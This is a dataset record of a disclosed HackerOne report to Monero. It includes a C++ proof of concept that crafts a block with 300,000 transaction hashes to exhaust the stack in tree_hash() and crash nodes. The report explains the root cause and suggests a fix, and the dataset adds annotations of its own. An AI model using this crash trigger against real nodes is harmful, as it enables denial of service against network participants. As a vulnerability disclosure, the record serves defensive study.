{
  "reported_to": "Monero",
  "reported_by": "guido ",
  "title": "Computing hash of crafted block leads to crash in tree_hash()",
  "content": "\nI'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:\nCode 601 Bytes\n1#include <cryptonote_basic/cryptonote_format_utils.h>\n2\n3int main(void)\n4{\n5    cryptonote::block b = AUTO_VAL_INIT(b);\n6    for (size_t i = 0; i < 300000; i++) {\n7        b.tx_hashes.push_back({});\n8    }\n9    std::ostringstream oss;\n10    binary_archive<true> ba(oss);\n11    std::string s;\n12    if ( ::serialization::serialize(ba, b) == true ) {\n13        s = oss.str();\n14    } else {\n15        return 0;\n16    }\n17\n18/* Uncomment to crash */\n19    cryptonote::block b2 = AUTO_VAL_INIT(b2);\n20    if ( parse_and_validate_block_from_blob(s, b2) == true ) {\n21        /* Crash */\n22        get_tx_tree_hash(b2);\n23    }\n24    return 0;\n25}\nThe reason this crashes is because of this code in tree_hash:\nCode 127 Bytes\n1    char ints[cnt][HASH_SIZE];\n2    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem\nints is allocated on the stack, not on the heap. Its size is dynamic; cnt (derived from the number of tx_hashes in this example) multiplied by 32 (HASH_SIZE) is the amount of bytes reserved on the stack.\nOn a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of tx_hashes will cause more stack to be reserved than is available.\nTechnically, the reservation of the stack space doesn't cause the crash (this only alters the stack pointer), but the subsequent memset does.\nNote that the serialized size of a block with 300000 tx_hashes is about 9 MB (see s.size()), which is well within the limits of CRYPTONOTE_MAX_BLOCK_SIZE (500MB).\nThe best remediation to this issue is to use allocate memory on the heap, not the stack.\nImpact\nCrash nodes\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 2,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1562127060,
  "report_url": "https://hackerone.com/reports/519120",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a cryptonote::block object and populate it with 300,000 empty transaction hashes"
    ],
    [
      2,
      "Attempt to compute the transaction tree hash using get_tx_tree_hash() on the crafted block"
    ]
  ],
  "vuln_description": "The vulnerability involves a stack overflow in the tree_hash() function when processing a block with an excessive number of transaction hashes. The function allocates a large array on the stack based on the transaction count, which when combined with the memset operation causes a crash due to stack exhaustion.",
  "reason": "The vulnerability requires understanding of the block structure and serialization in Monero, as well as the internal workings of the tree_hash function. However, the core issue (stack overflow from large allocations) is a well-known class of vulnerability, making the discovery process more straightforward once the relevant code paths are identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}